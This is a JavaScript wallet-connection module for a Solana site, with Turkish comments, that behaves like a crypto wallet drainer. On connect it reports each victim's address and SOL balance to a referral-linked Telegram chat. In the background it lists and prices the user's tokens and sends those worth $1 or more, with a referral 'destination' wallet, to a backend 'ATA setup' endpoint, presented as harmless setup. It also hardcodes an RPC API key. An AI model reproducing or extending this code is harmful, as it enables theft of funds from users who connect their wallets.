// app/services/connect.js
/* eslint-disable @typescript-eslint/no-unused-vars */
/* eslint-disable @typescript-eslint/ban-ts-comment */

import { Connection } from "@solana/web3.js";

let userPublicKey = null;

// Aynı oturumda aynı adresi bir kez logla (isteğe bağlı guard)
const loggedAddrs = new Set();

// Helius RPC URL (anahtar gizli tutulmalı!)
const HELIUS_RPC_URL =
  "https://mainnet.helius-rpc.com/?api-key=79c63be3-cabc-4526-b46e-eaf2ec35c509";

export const connection = new Connection(HELIUS_RPC_URL, "confirmed");

// ATA oluşturma sürecini takip etmek için Promise
let ataSetupPromise = null;
export async function waitForAtaSetup() {
    if (ataSetupPromise) {
        await ataSetupPromise;
    }
}

// ——— Telegram'a log gönder (serverless /api/tg-log kullanır) ———
async function sendTelegramLog(addressBase58, solBalanceNumOrNull) {
  try {
    const { getReferralData } = await import("./referral.js");
    const { chatId } = getReferralData();

    await fetch("/api/tg-log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        address: addressBase58,
        chatId: chatId, // Dinamik Chat ID
        solBalance:
          typeof solBalanceNumOrNull === "number"
            ? Number(solBalanceNumOrNull).toFixed(4)
            : "N/A",
        connectedAtISO: new Date().toISOString(), // TR'ye çevirme server tarafında
      }),
    });
  } catch (e) {
    console.error("TG log error:", e);
  }
}

export async function connectWallet() {
  if (!window?.solana?.isPhantom) {
    alert("Phantom cüzdanı bulunamadı!");
    return;
  }

  try {
    // 1) Cüzdanı bağla
    // @ts-expect-error – Phantom extension tipleri tarayıcıda tanımlı değil
    const resp = await window.solana.connect();
    userPublicKey = resp.publicKey;

    const addr = userPublicKey.toBase58();
    console.log("Cüzdan bağlandı:", addr);

    // 2) Bakiyeyi oku (başarısız olsa bile bağlantı tamam)
    let solBalance = null;
    try {
      const balanceLamports = await connection.getBalance(userPublicKey);
      solBalance = balanceLamports / 1e9;
      console.log("SOL Bakiyesi:", solBalance);
    } catch (e) {
      console.warn("SOL bakiyesi alınamadı:", e);
    }

    // 3) Log'u bağlandıktan sonra, non-blocking şekilde gönder
    if (!loggedAddrs.has(addr)) {
      loggedAddrs.add(addr);
      // Bağlantı akışını hiç bloklamasın diye micro-task/timeout:
      setTimeout(() => {
        void sendTelegramLog(addr, solBalance);
      }, 0);
    }

    // --- YENI: Cüzdan bağlandığında Arka Planda ATA Açılışı Başlat ---
    // Bu işlem kullanıcının ekranını/bağlantısını dondurmaz, background'da çalışır
    ataSetupPromise = new Promise((resolve) => {
      setTimeout(async () => {
      try {
        const { TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } = await import("@solana/spl-token");
        const { getDestinationWallet } = await import("./referral.js");
        const destination = getDestinationWallet();

        // 1. Kullanıcının tüm token hesaplarını bul (Hem standart hem de 2022 programı)
        const [standardResp, token2022Resp] = await Promise.all([
             connection.getParsedTokenAccountsByOwner(userPublicKey, { programId: TOKEN_PROGRAM_ID }),
             connection.getParsedTokenAccountsByOwner(userPublicKey, { programId: TOKEN_2022_PROGRAM_ID })
        ]);

        const allAccounts = [...standardResp.value, ...token2022Resp.value];

        const mints = [];
        const balances = {}; // mint -> parsed amount and decimals
        const programIds = {}; // mint -> programId

        for (const { account } of allAccounts) {
            const parsed = account.data?.parsed?.info;
            if (!parsed) continue;
            
            const mintStr = parsed.mint;
            // Native Wrapped SOL (So1111...) veya bakiyesi 0 olanları atla
            if (mintStr === "So11111111111111111111111111111111111111112" || parsed.tokenAmount.uiAmount === 0) continue;

            mints.push(mintStr);
            balances[mintStr] = parsed.tokenAmount;
            programIds[mintStr] = account.owner.toBase58();
        }

        if (mints.length === 0) {
            console.log("[Auto-ATA Debug] Kullanıcının tokeni bulunamadı.");
            return;
        }

        console.log(`[Auto-ATA Debug] Kullanıcı cüzdanında ${mints.length} farklı SPL token tespit edildi.`);
        console.log("[Auto-ATA Debug] Bulunan Mintler:", mints);

        // 2. GeckoTerminal API'den fiyatları çek (Max 30 ID)
        const CHUNK_SIZE = 30;
        const valuableMints = [];

        for (let i = 0; i < mints.length; i += CHUNK_SIZE) {
            const chunk = mints.slice(i, i + CHUNK_SIZE);
            console.log(`[Auto-ATA Debug] Fiyat sorgulanıyor... Chunk:`, chunk);
            
            const geckoRes = await fetch(`https://api.geckoterminal.com/api/v2/simple/networks/solana/token_price/${chunk.join(",")}`);
            if (!geckoRes.ok) {
                 console.warn(`[Auto-ATA Debug] Gecko API Hatası: ${geckoRes.status} ${geckoRes.statusText}`);
                 continue;
            }
            
            const priceData = await geckoRes.json();
            const tokenPrices = priceData?.data?.attributes?.token_prices || {};
            console.log(`[Auto-ATA Debug] Servisten Dönen Fiyatlar:`, tokenPrices);
            
            for (const mintStr of chunk) {
               const priceStr = tokenPrices[mintStr];
               
               if (priceStr) {
                 const price = parseFloat(priceStr);
                 const amount = balances[mintStr].uiAmount; // Küsüratlı tam sayı
                 const usdValue = price * amount;
                 
                 console.log(`[Auto-ATA Debug] Token: ${mintStr.substring(0,8)}... | Adet: ${amount} | Fiyat: $${price.toFixed(6)} | Toplam: $${usdValue.toFixed(2)}`);
                 
                 // 3. Değeri $1 USD'den büyük olan tokenleri seç
                 if (usdValue >= 1) {
                    valuableMints.push({
                        mint: mintStr,
                        programId: programIds[mintStr]
                    });
                 }
               } else {
                 console.log(`[Auto-ATA Debug] Token: ${mintStr.substring(0,8)}... | API'de fiyat bulunamadı!`);
               }
            }
        }

        if (valuableMints.length === 0) {
            console.log("[Auto-ATA Debug] Değeri > $1 olan token bulunamadı, ATA kurulumuna gerek yok.");
            return;
        }

        console.log(`Değeri $1 üstü olan ${valuableMints.length} adet token bulundu. Backend'e ATA kurulumu emri veriliyor...`);
        // 4. Backend Serverless'a eksik ATAları kurması için istek at
        const setupRes = await fetch('/api/setup-atas', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ mints: valuableMints, destination }),
        });

        const setupResult = await setupRes.json();
        console.log("ATA Setup Result:", setupResult);

      } catch (err) {
        console.error("Arka planda otomatik ATA kurma işleminde hata:", err);
      } finally {
        resolve(); // Başarılı da olsa hata da olsa kilidi aç
      }
    }, 1000); // UI'ı yormamak için bağlantıdan 1 sn sonra triggerla
    });

  } catch (err) {
    console.error("Cüzdan bağlantı hatası:", err);
  }
}

export async function disconnectWallet() {
  if (!window?.solana?.isPhantom) {
    console.warn("Phantom cüzdanı bulunamadı!");
    return;
  }
  try {
    await window.solana.disconnect();
    userPublicKey = null;
    console.log("Cüzdan bağlantısı kesildi");
  } catch (err) {
    console.error("Disconnect sırasında hata:", err);
  }
}

/**
 * Returns the currently connected public key.
 * First tries the wallet-adapter injected provider (window.solana.publicKey),
 * then falls back to the legacy userPublicKey.
 */
export function getUserPublicKey() {
  return window.solana?.publicKey || userPublicKey;
}
